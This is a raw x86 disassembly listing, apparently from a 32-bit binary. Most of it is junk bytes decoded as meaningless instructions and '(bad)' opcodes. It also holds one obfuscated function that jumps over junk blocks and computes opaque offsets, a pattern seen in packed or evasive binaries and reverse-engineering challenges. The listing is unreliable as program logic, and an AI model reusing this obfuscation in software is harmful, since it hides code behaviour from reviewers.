  410c57:	shl    DWORD PTR [edx+edx*4+0x6b0c7b0e],cl
  410c5e:	clc    
  410c5f:	lods   eax,DWORD PTR ds:[esi]
  410c60:	mov    ?,WORD PTR [edx-0x11d2d7d8]
  410c66:	or     cl,BYTE PTR [edx]
  410c68:	add    eax,0x8f27b9a6
  410c6d:	cmp    dl,BYTE PTR ds:0x930efb4c
  410c73:	push   eax
  410c74:	mov    esp,0xb0fefafc
  410c79:	and    DWORD PTR [edi],eax
  410c7b:	popa   
  410c7c:	inc    esi
  410c7d:	fs dec ecx
  410c7f:	mov    bh,0x7b
  410c81:	sub    edx,ebp
  410c83:	dec    eax
  410c84:	hlt    
  410c85:	sub    DWORD PTR [ebx-0x7d],ecx
  410c88:	std    
  410c89:	jo     0x410c39
  410c8b:	js     0x410c66
  410c8d:	fbstp  TBYTE PTR [ebp-0x72]
  410c90:	mov    WORD PTR [ebx-0x5d],gs
  410c93:	jae    0x410c5b
  410c95:	stc    
  410c96:	shr    DWORD PTR [edi],0xfe
  410c99:	mov    cs,WORD PTR [ebx]
  410c9b:	sbb    eax,DWORD PTR [ebx+0x30]
  410c9e:	cmp    bh,dh
  410ca0:	aaa    
  410ca1:	enter  0x4ae9,0x1f
  410ca5:	and    al,dh
  410ca7:	mov    ah,0xf9
  410ca9:	mov    ebx,0x706f53ba
  410cae:	or     al,0x47
  410cb0:	push   0xfaa41095
  410cb5:	add    al,BYTE PTR [ebx+0x72]
  410cb8:	enter  0xc9ef,0xf
  410cbc:	sbb    ebp,DWORD PTR [eax]
  410cbe:	add    al,0x48
  410cc0:	pop    ecx
  410cc1:	sti    
  410cc2:	out    dx,al
  410cc3:	fsub   DWORD PTR [ebx]
  410cc5:	repnz scas al,BYTE PTR es:[edi]
  410cc7:	iret   
  410cc8:	jmp    FWORD PTR [ecx]
  410cca:	sbb    DWORD PTR [eax],ebx
  410ccc:	outs   dx,BYTE PTR ds:[esi]
  410ccd:	mov    bh,0x87
  410ccf:	cld    
  410cd0:	ins    BYTE PTR es:[edi],dx
  410cd1:	(bad)  
  410cd2:	test   DWORD PTR ds:0x18f441c,esi
  410cd8:	ficomp WORD PTR [esi-0x12f32aee]
  410cde:	fisubr DWORD PTR [edx-0x7f]
  410ce1:	and    cl,dl
  410ce3:	push   ebx
  410ce4:	sahf   
  410ce5:	mov    ebp,0x67199c7c
  410cea:	mov    edi,0x14b86918
  410cef:	hlt    
  410cf0:	fwait
  410cf1:	pusha  
  410cf2:	pop    edx
  410cf3:	mov    edx,ss
  410cf5:	cmp    edx,DWORD PTR [edx]
  410cf7:	mov    edx,0xec30b108
  410cfc:	dec    ebx
  410cfd:	rcr    eax,cl
  410cff:	aam    0xac
  410d01:	fisub  DWORD PTR [edi-0x20]
  410d04:	out    dx,al
  410d05:	add    edx,DWORD PTR [edi-0x18d9339c]
  410d0b:	ror    BYTE PTR [ebx],0x26
  410d0e:	xor    DWORD PTR [esi-0x6e7935f0],edx
  410d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d16:	add    dl,cl
  410d18:	aam    0xa
  410d1a:	ds jne 0x410cc1
  410d1d:	inc    eax
  410d1e:	ins    DWORD PTR es:[edi],dx
  410d1f:	mov    esi,DWORD PTR [esi+ebx*2]
  410d22:	inc    edi
  410d23:	jge    0x410cd4
  410d25:	dec    esp
  410d26:	mov    edx,0x144aae19
  410d2b:	jp     0x410d3a
  410d2d:	cmp    eax,0xf6748808
  410d32:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d34:	cmp    BYTE PTR [eax+0x1d531029],dh
  410d3a:	je     0x410d7b
  410d3c:	ja     0x410d9a
  410d3e:	cmp    ebx,edx
  410d40:	or     BYTE PTR [esi+0x33],bl
  410d43:	(bad)  
  410d44:	push   ebp
  410d45:	lds    edx,FWORD PTR [ebx+eiz*1-0x32]
  410d49:	xchg   ebx,eax
  410d4a:	into   
  410d4b:	icebp  
  410d4c:	mov    edi,0x957b8389
  410d51:	or     dl,BYTE PTR [edx]
  410d53:	sub    esi,DWORD PTR [edi+0x1415a046]
  410d59:	jp     0x410dc5
  410d5b:	stc    
  410d5c:	outs   dx,BYTE PTR ds:[esi]
  410d5d:	adc    bh,dl
  410d5f:	jno    0x410d7c
  410d61:	jge    0x410dba
  410d63:	test   DWORD PTR [esi],edi
  410d65:	das    
  410d66:	(bad)  
  410d67:	in     al,0xdf
  410d69:	rcl    DWORD PTR [esi],cl
  410d6b:	push   ds
  410d6c:	push   esi
  410d6d:	cmp    ch,BYTE PTR [ebx-0x78]
  410d70:	push   ebp
  410d71:	je     0x410d34
  410d73:	mov    al,0x9e
  410d75:	daa    
  410d76:	cmc    
  410d77:	mov    dh,0x25
  410d79:	(bad)  
  410d7a:	jmp    0x2d77249f
  410d7f:	retf   0x58c8
  410d82:	mov    edx,0xa872e836
  410d87:	add    ebp,DWORD PTR [esp+edx*4-0x79f6b21a]
  410d8e:	jmp    0x3c54:0xaca96879
  410d95:	pop    ecx
  410d96:	sub    BYTE PTR [esi+0x4],ch
  410d99:	mov    eax,0x618fe85b
  410d9e:	aam    0x5
  410da0:	cli    
  410da1:	push   ds
  410da2:	sti    
  410da3:	imul   DWORD PTR [edx-0x4553e593]
  410da9:	dec    ebx
  410daa:	dec    ebx
  410dab:	mov    ds:0xb9fd93c0,eax
  410db0:	mov    bh,0xff
  410db2:	mov    edi,fs
  410db4:	js     0x410e2e
  410db6:	out    dx,al
  410db7:	xor    eax,0x62181bd9
  410dbc:	pop    edx
  410dbd:	xchg   esi,ebx
  410dbf:	cmp    eax,DWORD PTR [esi-0x770a2087]
  410dc5:	adc    al,0x1f
  410dc7:	jae    0x410d8c
  410dc9:	jge    0x410e47
  410dcb:	fcmovu st,st(2)
  410dcd:	mov    cs,ecx
  410dcf:	mov    eax,0x29d3ae3b
  410dd4:	test   al,0xa6
  410dd6:	cmp    DWORD PTR [edi],eax
  410dd8:	retf   0x85
  410ddb:	mov    DWORD PTR [ecx+0x24],0xe33d6744
  410de2:	jns    0x410d98
  410de4:	out    dx,eax
  410de5:	dec    eax
  410de6:	fwait
  410de7:	xchg   esi,esp
  410de9:	rcr    DWORD PTR [esi+0x45089ea],1
  410def:	pop    ebx
  410df0:	leave  
  410df1:	ret    0x8
  410df4:	push   ebp
  410df5:	mov    ebp,esp
  410df7:	sub    esp,0x3c
  410dfa:	mov    DWORD PTR [ebp-0x20],0x3510
  410e01:	mov    DWORD PTR [ebp-0x1c],0x2104
  410e08:	mov    DWORD PTR [ebp-0x18],0x5d15
  410e0f:	mov    DWORD PTR [ebp-0x14],0x30cd
  410e16:	mov    DWORD PTR [ebp-0x10],0x1709
  410e1d:	mov    DWORD PTR [ebp-0xc],0x260b
  410e24:	jmp    0x4110ab
  410e29:	jo     0x410db5
  410e2b:	fldl2e 
  410e2d:	cmp    al,0xb9
  410e2f:	jo     0x410dcd
  410e31:	out    0x46,eax
  410e33:	mov    ah,BYTE PTR [ebx+ebx*8+0x3b90a47b]
  410e3a:	dec    edx
  410e3b:	mov    esi,0xbec289be
  410e40:	mov    esi,0xc25480df
  410e45:	cmp    BYTE PTR [ebx-0x64107a91],dl
  410e4b:	retf   
  410e4c:	cmp    BYTE PTR [esi],cl
  410e4e:	(bad)  
  410e4f:	xlat   BYTE PTR ds:[ebx]
  410e50:	in     al,0x4c
  410e52:	ds scas al,BYTE PTR es:[edi]
  410e54:	push   esp
  410e55:	add    cl,BYTE PTR [eax-0x6bbe3c1e]
  410e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e5c:	sbb    al,0xb3
  410e5e:	xchg   DWORD PTR [eax-0x1d],edi
  410e61:	hlt    
  410e62:	xchg   bl,ch
  410e64:	shr    BYTE PTR [ebp+eax*8+0x6378b5f0],cl
  410e6b:	mov    esp,0xbf094c2c
  410e70:	inc    ecx
  410e71:	push   esi
  410e73:	rol    DWORD PTR [eax-0x2402482c],1
  410e79:	es ins BYTE PTR es:[edi],dx
  410e7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e7c:	xor    BYTE PTR [esi+0x5ca84537],ah
  410e82:	imul   esp,DWORD PTR [esi+ebp*1-0x4f],0x3100f3b6
  410e8a:	in     eax,dx
  410e8b:	test   eax,0xcb8b3713
  410e90:	inc    ebp
  410e91:	je     0x410e6d
  410e93:	loope  0x410e58
  410e95:	inc    edi
  410e96:	push   esi
  410e97:	inc    esi
  410e98:	mov    ecx,0xfe5ee032
  410e9d:	rcr    BYTE PTR [ebx+0xff0b1c6],cl
  410ea3:	(bad)  
  410ea4:	xchg   edi,eax
  410ea5:	xchg   edx,eax
  410ea6:	dec    ebp
  410ea7:	dec    esp
  410ea8:	jmp    0x8d4f:0x61a06401
  410eaf:	sbb    eax,0xa2d548d0
  410eb4:	mov    ds:0xed6e7b04,al
  410eb9:	pop    ss
  410eba:	(bad)  
  410ebd:	es int3 
  410ebf:	inc    edx
  410ec0:	fsubr  QWORD PTR [ecx]
  410ec2:	stos   DWORD PTR es:[edi],eax
  410ec3:	add    BYTE PTR [edx+0x1b],0x6e
  410ec7:	and    al,0xc4
  410ec9:	add    ah,cl
  410ecb:	adc    ecx,esp
  410ecd:	icebp  
  410ece:	jne    0x410e9b
  410ed0:	cmp    al,0x1f
  410ed2:	jmp    FWORD PTR [ebx-0x1f]
  410ed5:	xor    bl,BYTE PTR [eax+0x71]
  410ed8:	(bad)
  410edb:	push   es
  410edc:	cld    
  410edd:	fbstp  TBYTE PTR [ebx]
  410edf:	xchg   DWORD PTR [ebx+0x22],ebp
  410ee2:	pop    esi
  410ee3:	or     eax,0xccd7396f
  410ee8:	cwde   
  410ee9:	cmc    
  410eea:	dec    ebp
  410eeb:	push   edi
  410eec:	lahf   
  410eed:	cld    
  410eee:	push   0x3d
  410ef0:	lahf   
  410ef1:	mov    DWORD PTR [ebp+0x364b78cc],eax
  410ef7:	mov    ds:0x4f37f519,al
  410efc:	scas   eax,DWORD PTR es:[edi]
  410efd:	ret    0x672f
  410f00:	jge    0x410ed3
  410f02:	mov    edx,0x615d1e05
  410f07:	rol    cl,1
  410f09:	dec    esp
  410f0a:	inc    esi
  410f0b:	ja     0x410eb4
  410f0d:	lea    ebp,[edi+edx*2]
  410f10:	jmp    0x410f83
  410f12:	pop    ss
  410f13:	xchg   edx,eax
  410f14:	push   ebp
  410f15:	outs   dx,DWORD PTR ds:[esi]
  410f16:	popa   
  410f17:	test   eax,0xac5ad727
  410f1c:	mov    edx,0xe5a5d1c5
  410f21:	(bad)  
  410f22:	dec    edi
  410f23:	jo     0x410ed1
  410f25:	xchg   esi,eax
  410f26:	sbb    al,0x4f
  410f28:	push   0xf5e65dcd
  410f2d:	stc    
  410f2e:	jb     0x410f6d
  410f30:	stc    
  410f31:	xor    DWORD PTR [edx],0x80435c7e
  410f37:	dec    esi
  410f38:	push   es
  410f39:	and    DWORD PTR [ebx-0x2d107510],0x49
  410f40:	fst    QWORD PTR [esi-0x4a]
  410f43:	dec    ebx
  410f44:	cmp    ebp,ecx
  410f46:	sub    edi,esi
  410f48:	stos   BYTE PTR es:[edi],al
  410f49:	mov    edi,0xaecd28b
  410f4e:	mov    ecx,0xce10900c
  410f53:	lahf   
  410f54:	jmp    0x871857d2
  410f59:	xor    bh,BYTE PTR [eax]
  410f5b:	repz cmp BYTE PTR [ebx*1+0x3b6d431d],0x66
  410f64:	inc    ecx
  410f65:	add    BYTE PTR [edx-0x4b],bh
  410f68:	popf   
  410f69:	add    esi,DWORD PTR [ebp+0x3badf618]
  410f6f:	xor    bh,BYTE PTR ds:0x88688b9b
  410f75:	sub    esi,DWORD PTR [edx]
  410f77:	cmc    
  410f78:	les    ebx,FWORD PTR [edi-0x65]
  410f7b:	(bad)  
  410f7d:	push   edi
  410f7e:	push   cs
  410f7f:	cmc    
  410f80:	mov    cl,0x33
  410f82:	xor    BYTE PTR [edi],ah
  410f84:	ins    BYTE PTR es:[edi],dx
  410f85:	pop    esp
  410f86:	mov    dh,0x69
  410f88:	xor    esp,DWORD PTR [ebp+eiz*2+0x7]
  410f8c:	or     eax,0x6ae38739
  410f91:	js     0x410fa3
  410f93:	push   0xfb18a922
  410f98:	call   0x73fa4dda
  410f9d:	inc    eax
  410f9e:	rcl    BYTE PTR [esi],0x2
  410fa1:	ins    BYTE PTR es:[edi],dx
  410fa2:	ins    BYTE PTR es:[edi],dx
  410fa3:	jp     0x410fc7
  410fa5:	in     al,dx
  410fa6:	(bad)  
  410fa7:	shl    BYTE PTR [edx+0x46c78f06],1
  410fad:	jae    0x410fa0
  410faf:	xor    BYTE PTR [ecx],0xc4
  410fb2:	or     eax,0xb2f407c6
  410fb7:	add    DWORD PTR [esi+ebp*4-0x1],esi
  410fbb:	ins    BYTE PTR es:[edi],dx
  410fbc:	ds out 0x63,al
  410fbf:	outs   dx,BYTE PTR gs:[esi]
  410fc1:	add    al,0x55
  410fc4:	jo     0x411000
  410fc6:	cdq    
  410fc7:	ror    eax,1
  410fc9:	and    DWORD PTR ds:0x161a9c4c,0xb2020a3b
  410fd3:	test   eax,0xae7e5643
  410fd8:	fidivr WORD PTR [edx-0x9]
  410fdb:	out    0x22,al
  410fdd:	and    DWORD PTR [ebp-0x6c],esi
  410fe0:	scas   eax,DWORD PTR es:[edi]
  410fe1:	in     eax,dx
  410fe2:	and    BYTE PTR ds:0x4cbb0007,bh
  410fe8:	(bad)  
  410fe9:	sbb    ebx,DWORD PTR [esi+0x6b]
  410fec:	xchg   edi,eax
  410fed:	mul    esi
  410fef:	sti    
  410ff0:	scas   eax,DWORD PTR es:[edi]
  410ff1:	xor    edi,DWORD PTR [eax-0xe]
  410ff4:	mov    esp,0x4fe1b5a9
  410ff9:	das    
  410ffa:	jns    0x411000
  410ffc:	ds cwde 
  410ffe:	arpl   WORD PTR [ebp-0x36],ax
  411001:	(bad)  
  411002:	mov    bl,0x85
  411004:	out    0x57,eax
  411006:	mov    dh,0x90
  411008:	je     0x41106a
  41100a:	(bad)  
  41100b:	neg    DWORD PTR [edi]
  41100d:	inc    eax
  41100e:	add    DWORD PTR [edi],ecx
  411010:	icebp  
  411011:	lods   al,BYTE PTR ds:[esi]
  411012:	rol    DWORD PTR [edi-0x51],1
  411015:	loopne 0x410fce
  411017:	dec    edx
  411018:	popf   
  411019:	lahf   
  41101a:	int3   
  41101b:	ins    BYTE PTR es:[edi],dx
  41101c:	cmp    DWORD PTR [edx+0x22],esi
  41101f:	mov    ecx,0x65da51a4
  411024:	repnz out 0xb4,eax
  411027:	ins    DWORD PTR es:[edi],dx
  411028:	push   cs
  411029:	in     al,dx
  41102a:	aaa    
  41102b:	jns    0x411061
  41102d:	inc    edi
  41102e:	inc    esi
  41102f:	adc    cl,BYTE PTR [ebx+0x34]
  411032:	fidivr DWORD PTR [eax]
  411034:	out    0xb3,eax
  411036:	fcom   QWORD PTR [edi-0x1e]
  411039:	push   ss
  41103a:	push   0x57ac5ef4
  41103f:	cmc    
  411040:	ja     0x41103e
  411042:	nop
  411043:	xchg   edx,eax
  411044:	test   eax,0xaf12a7e0
  411049:	out    0xa6,eax
  41104b:	(bad)  
  41104c:	call   0x57f81e42
  411051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411052:	pushf  
  411053:	dec    si
  411055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411056:	add    BYTE PTR [ebx+0x7783b664],0x79
  41105d:	adc    al,0xa6
  41105f:	adc    esp,esp
  411061:	sub    al,0xd4
  411063:	test   eax,0x2477b0eb
  411068:	add    dl,bh
  41106a:	xor    BYTE PTR [eax-0x1e4e44c4],ah
  411070:	out    dx,eax
  411071:	test   eax,0x8773765
  411076:	int    0x82
  411078:	mov    dl,0xe6
  41107a:	adc    DWORD PTR [ecx+edx*4],0xfffffff3
  41107e:	fcmovnu st,st(4)
  411080:	xchg   edx,eax
  411081:	repz jno 0x41103e
  411084:	mov    ecx,0x8f06b4f3
  411089:	xor    al,0x17
  41108b:	lds    eax,FWORD PTR [ebp-0x67]
  41108e:	xchg   ebx,eax
  411090:	shl    BYTE PTR [ebx-0x5a],cl
  411093:	ins    BYTE PTR es:[edi],dx
  411094:	inc    esi
  411095:	in     eax,0x78
  411097:	rol    BYTE PTR [esi-0x795a4b10],1
  41109d:	stc    
  41109e:	pop    ss
  41109f:	lea    ebx,[eax-0x20ff3183]
  4110a5:	jae    0x4110ac
  4110a7:	test   DWORD PTR [edx+eax*2-0x5b],ebp
  4110ab:	mov    DWORD PTR [ebp-0x8],0x3204
  4110b2:	mov    DWORD PTR [ebp-0x4],0x62ea
  4110b9:	mov    DWORD PTR [ebp-0x38],0x58e9
  4110c0:	jmp    0x411347
  4110c5:	pop    edx
  4110c6:	daa    
  4110c7:	fcomp  QWORD PTR [eax-0x44]
  4110ca:	mov    esp,0xf3ba2b5a
  4110cf:	aad    0xe3
  4110d1:	ins    BYTE PTR es:[edi],dx
  4110d2:	jae    0x41110c
  4110d4:	xchg   edx,eax
  4110d5:	or     BYTE PTR [esi-0x42],cl
  4110d8:	mov    esi,0xbebec289
  4110dd:	mov    al,ds:0x58dca49e
  4110e2:	ret    0x3a4f
  4110e5:	imul   edi,DWORD PTR [eax+0x17],0x2fcdb35c
  4110ec:	(bad)  
  4110ed:	and    dl,BYTE PTR [ecx+0x3f]
  4110f0:	aaa    
  4110f1:	adc    BYTE PTR [eax+ebp*4+0x55],bl
  4110f5:	or     DWORD PTR [ecx-0x1e613d3e],esi
  4110fb:	dec    esi
  4110fc:	dec    ecx
  4110fd:	or     al,0x40
  4110ff:	stos   DWORD PTR es:[edi],eax
  411100:	mov    ch,0x9c
  411102:	xchg   BYTE PTR [ecx],bl
  411104:	cli    
  411105:	ret    0x65ec
  411108:	mov    esi,0xa6241181
  41110d:	cdq    
  41110e:	jp     0x411189
  411110:	sub    BYTE PTR [eax],0xc0
  411113:	inc    eax
  411114:	clc    
  411115:	call   DWORD PTR [ebp-0x4f]
  411118:	je     0x4110ce
  41111a:	sahf   
  41111b:	sar    ah,1
  41111d:	test   eax,0xb88f05f1
  411122:	mov    cl,0xa4
  411124:	jnp    0x411190
  411126:	push   ss
  411127:	mov    ds:0xb270486a,al
  41112c:	ret    
  41112d:	dec    ecx
  41112e:	(bad)  
  41112f:	stos   DWORD PTR es:[edi],eax
  411130:	push   cs
  411131:	add    DWORD PTR [eax-0x17],eax
  411134:	pop    es
  411135:	mov    BYTE PTR [ebp+0x490cf585],dh
  41113b:	adc    bh,al
  41113d:	loopne 0x4111a0
  41113f:	into   
  411140:	es inc esi
  411142:	xchg   ebp,eax
  411143:	mov    ecx,0x6d6a3baa
  411148:	xchg   edi,eax
  411149:	ja     0x4110d4
  41114b:	aaa    
  41114c:	add    al,0x7c
  41114e:	pop    ds
  41114f:	test   eax,0xd9799c35
  411154:	push   0xc5140342
  411159:	dec    edi
  41115a:	sahf   
  41115b:	pop    ecx
  41115c:	push   ds
  41115d:	mov    al,ds:0x849ecba5
  411162:	adc    al,0x15
  411164:	(bad)  
  411165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411166:	loop   0x4111a5
  411168:	aas    
  411169:	jo     0x411173
  41116b:	adc    BYTE PTR [esi-0x59],0x8b
  41116f:	sub    bl,BYTE PTR [edi-0x6f]
  411172:	fwait
  411173:	lods   al,BYTE PTR ds:[esi]
  411174:	adc    ecx,DWORD PTR [edi+0x50a8a5ed]
  41117a:	dec    edi
  41117b:	test   eax,0x36192045
  411180:	test   BYTE PTR [edx-0x70],dh
  411183:	out    dx,al
  411184:	aas    
  411185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411186:	add    eax,0x9a613597
  41118b:	and    cl,BYTE PTR ds:0xcf427db6
  411191:	popf   
  411192:	shl    BYTE PTR [esi+0x62ac7ca6],cl
  411198:	js     0x411210
  41119a:	loope  0x41112f
  41119c:	nop
  41119d:	in     eax,dx
  41119e:	je     0x41115f
  4111a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111a1:	sbb    ch,BYTE PTR ds:0xb9a44e28
  4111a7:	mov    edi,ss
  4111a9:	test   BYTE PTR [ebp-0x2dafbb04],dh
  4111af:	dec    edi
  4111b0:	dec    ebx
  4111b1:	outs   dx,BYTE PTR ds:[esi]
  4111b2:	daa    
  4111b3:	stos   DWORD PTR es:[edi],eax
  4111b4:	dec    ebx
  4111b5:	mov    ebp,0x1bc486a8
  4111ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111bb:	cwde   
  4111bc:	xchg   DWORD PTR [edi],eax
  4111be:	sub    edi,ebx
  4111c0:	adc    eax,0x165a4cdc
  4111c5:	jnp    0x4111a0
  4111c7:	mov    bl,0x76
  4111c9:	mov    eax,ds:0x453c5fa1
  4111ce:	mov    eax,ds:0xa674a0e1
  4111d3:	adc    eax,0x5f1735c3
  4111d8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4111da:	xor    cl,BYTE PTR [edx]
  4111dc:	xchg   ebx,eax
  4111dd:	loope  0x4111be
  4111df:	stos   BYTE PTR es:[edi],al
  4111e0:	mov    ebp,0xb8b41cf3
  4111e5:	lds    ebx,FWORD PTR [edx]
  4111e7:	push   ss
  4111e8:	frstor [edx]
  4111ea:	jg     0x4111db
  4111ec:	stos   DWORD PTR es:[edi],eax
  4111ed:	dec    edx
  4111ee:	jno    0x4111db
  4111f0:	fadd   QWORD PTR [edx+ebp*4+0x6cf1ac90]
  4111f7:	shl    esp,1
  4111f9:	push   ds
  4111fa:	cli    
  4111fb:	jp     0x411232
  4111fd:	xchg   BYTE PTR [ecx+edx*8+0x5b],ch
  411201:	adc    DWORD PTR [ebp+0x77583837],edi
  411207:	clc    
  411208:	sub    al,0x87
  41120a:	jge    0x411190
  41120c:	js     0x4111b0
  41120e:	mov    ebx,0x2db413f
  411213:	jmp    0x4111d9
  411215:	xlat   BYTE PTR ds:[ebx]
  411216:	cmp    DWORD PTR [ecx+ebx*1-0x250eada6],esi
  41121d:	ret    
  41121e:	retf   0x5fef
  411221:	mov    esp,0xf9156e78
  411226:	inc    DWORD PTR [ebp+eax*8-0x54]
  41122a:	mov    eax,edx
  41122c:	(bad)  
  41122d:	cmp    esp,DWORD PTR [ecx]
  41122f:	pop    es
  411230:	jbe    0x411264
  411232:	aam    0xec
  411234:	fcmove st,st(5)
  411236:	mov    eax,ds:0xb9ddebd3
  41123b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41123d:	sahf   
  41123e:	pop    edx
  41123f:	add    BYTE PTR [ebx+ebp*8-0x6aaa7aba],0x7e
  411247:	jmp    0x411264
  411249:	add    DWORD PTR [edi+0xa],eax
  41124c:	xchg   edx,eax
  41124d:	cdq    
  41124e:	mov    eax,ds:0xb71c1f3
  411253:	int    0x73
  411255:	leave  
  411256:	shl    DWORD PTR [esi+0x4f93de7e],cl
  41125c:	out    dx,eax
  41125d:	(bad)  
  41125f:	jle    0x411237
  411261:	xchg   ebp,eax
  411262:	xor    BYTE PTR [esp+edx*4],ah
  411265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411266:	loope  0x411290
  411268:	pushf  
  411269:	sub    DWORD PTR [ecx],0x7c031772
  41126f:	adc    eax,0x37c234a2
  411274:	shl    DWORD PTR [edx],1
  411276:	scas   al,BYTE PTR es:[edi]
  411277:	adc    dh,ch
  411279:	pop    eax
  41127a:	stos   BYTE PTR es:[edi],al
  41127b:	aas    
  41127c:	dec    esp
  41127d:	push   ecx
  41127e:	pop    eax
  41127f:	ja     0x4112e5
  411281:	jmp    0x41127f
  411283:	xor    DWORD PTR [ebx],edi
  411285:	xor    DWORD PTR [ecx+0x529eb519],ebp
  41128b:	push   edi
  41128c:	or     edi,esp
  41128e:	fs ds cmp al,0x7
  411292:	adc    bl,ch
  411294:	nop
  411295:	cli    
  411296:	mov    bl,0xad
  411298:	into   
  411299:	or     DWORD PTR [ecx+0x1f],eax
  41129c:	loop   0x4112dd
  41129e:	mov    esi,0xef3adbe9
  4112a3:	(bad)  
  4112a4:	fisttp WORD PTR [ebx]
  4112a6:	out    0x49,eax
  4112a8:	cld    
  4112a9:	push   ss
  4112aa:	dec    eax
  4112ab:	in     eax,0x38
  4112ad:	dec    esi
  4112ae:	xor    al,0xff
  4112b0:	cld    
  4112b1:	cmp    BYTE PTR [edx],bl
  4112b3:	cdq    
  4112b4:	push   0x25
  4112b6:	test   BYTE PTR [ebp+0x6c],ah
  4112b9:	int    0x80
  4112bb:	push   ecx
  4112bc:	inc    esi
  4112bd:	ins    DWORD PTR es:[edi],dx
  4112be:	test   DWORD PTR [eax+ecx*4],ebp
  4112c1:	dec    ebp
  4112c2:	xchg   DWORD PTR [esi-0x76ddccc4],ecx
  4112c8:	pop    esi
  4112c9:	jno    0x4112df
  4112cb:	enter  0x6078,0xcc
  4112cf:	xor    DWORD PTR [edx+ecx*8-0x66],esp
  4112d3:	jmp    ecx
  4112d5:	call   0x8b81f3b8
  4112da:	jle    0x411359
  4112dc:	shr    BYTE PTR [ebp-0x383789be],cl
  4112e2:	push   ecx
  4112e3:	mov    DWORD PTR [esi+0x56],edi
  4112e6:	ds xchg edx,eax
  4112e8:	fdivr  st,st(2)
  4112ea:	dec    esi
  4112eb:	fdivr  QWORD PTR [edi+eiz*2]
  4112ee:	loopne 0x411280
  4112f0:	lahf   
  4112f1:	or     al,BYTE PTR [esi+0x79]
  4112f4:	jmp    0x6087840c
  4112f9:	dec    edx
  4112fa:	les    ebp,FWORD PTR [eax-0x68ae6b97]
  411300:	mov    ebp,0x419c618d
  411305:	jmp    edx
  411307:	xor    al,0xf5
  411309:	add    al,0x1a
  41130b:	mov    esi,0xdc9fabee
  411310:	mov    ah,0x35
  411312:	adc    BYTE PTR [eax],cl
  411314:	gs hlt 
  411316:	xor    al,0xff
  411318:	loope  0x411335
  41131a:	mov    esi,0xf118dded
  41131f:	mov    ds:0x88e15123,eax
  411324:	out    0x80,al
  411326:	call   0x70de3052
  41132b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41132c:	mul    DWORD PTR [esp+eax*4]
  41132f:	fcomp  QWORD PTR [ebp-0x5f363112]
  411335:	mov    ds:0xf1ce1a3a,al
  41133a:	xor    eax,0xb34eeea9
  41133f:	push   ebx
  411340:	outs   dx,BYTE PTR ds:[esi]
  411341:	mov    bl,0x2f
  411343:	pop    esi
  411344:	and    eax,0x45c7b794
  411349:	int3   
  41134a:	mov    DWORD PTR [edi+0x0],edi
  41134d:	add    bh,al
  41134f:	inc    ebp
  411350:	rcr    dl,1
  411352:	jg     0x411354
  411354:	add    bh,al
  411356:	inc    ebp
  411357:	aam    0x89
  411359:	sub    BYTE PTR [eax],al
  41135b:	add    bh,al
  41135d:	inc    ebp
  41135e:	fmul   DWORD PTR [edi]
  411360:	sldt   WORD PTR [eax]
  411363:	mov    DWORD PTR [ebp-0x24],0x58e1
  41136a:	mov    DWORD PTR [ebp-0x3c],0x69c
  411371:	mov    eax,DWORD PTR [ebp-0x10]
  411374:	mov    ecx,DWORD PTR [ebp-0x14]
  411377:	and    al,0xb9
  411379:	add    al,cl
  41137b:	mov    ecx,DWORD PTR [ebp-0x18]
  41137e:	and    al,cl
  411380:	mov    ecx,DWORD PTR [ebp-0x1c]
  411383:	sub    al,0x11
  411385:	and    al,cl
  411387:	mov    ecx,DWORD PTR [ebp-0x20]
  41138a:	mov    edx,DWORD PTR [ebp+0x8]
  41138d:	imul   ecx,ecx,0x6008
  411393:	add    ecx,0x1759dd6e
  411399:	add    al,0x4d
  41139b:	xor    ecx,0x2b4185ee
  4113a1:	cmp    BYTE PTR [ecx+edx*1],al
  4113a4:	jne    0x41143e
  4113aa:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ad:	mov    eax,0xffffeff8
  4113b2:	mov    edx,eax
  4113b4:	sub    edx,ecx
  4113b6:	add    edx,DWORD PTR [ebp-0x8]
  4113b9:	mov    ecx,DWORD PTR [ebp-0xc]
  4113bc:	or     edx,ecx
  4113be:	mov    ecx,DWORD PTR [ebp-0x4]
  4113c1:	imul   edx,edx,0x85300
  4113c7:	sub    eax,ecx
  4113c9:	add    eax,DWORD PTR [ebp-0x8]
  4113cc:	mov    ecx,DWORD PTR [ebp-0xc]
  4113cf:	or     eax,ecx
  4113d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4113d4:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  4113db:	add    eax,0x40e5
  4113e0:	imul   eax,eax,0x214c
  4113e6:	add    eax,ecx
  4113e8:	mov    ecx,DWORD PTR [ebp+0x8]
  4113eb:	add    ecx,eax
  4113ed:	mov    DWORD PTR [ebp+0x8],ecx
  4113f0:	mov    eax,DWORD PTR [ebp-0x24]
  4113f3:	mov    ecx,DWORD PTR [ebp-0x28]
  4113f6:	and    eax,ecx
  4113f8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4113fb:	and    eax,ecx
  4113fd:	mov    ecx,DWORD PTR [ebp-0x30]
  411400:	imul   eax,ecx
  411403:	mov    ecx,DWORD PTR [ebp-0x34]
  411406:	or     eax,ecx
  411408:	mov    ecx,DWORD PTR [ebp-0x38]
  41140b:	imul   eax,ecx
  41140e:	mov    ecx,DWORD PTR [ebp+0x8]
  411411:	sub    eax,0x777ea653
  411416:	cmp    DWORD PTR [ecx+0x54],eax
  411419:	je     0x411427
  41141f:	mov    eax,DWORD PTR [ebp+0x8]
  411422:	jmp    0x41146e
  411427:	mov    eax,DWORD PTR [ebp-0x3c]
  41142a:	sub    eax,0x5258
  41142f:	xor    eax,0x49e9
  411434:	add    eax,0x253
  411439:	jmp    0x41146e
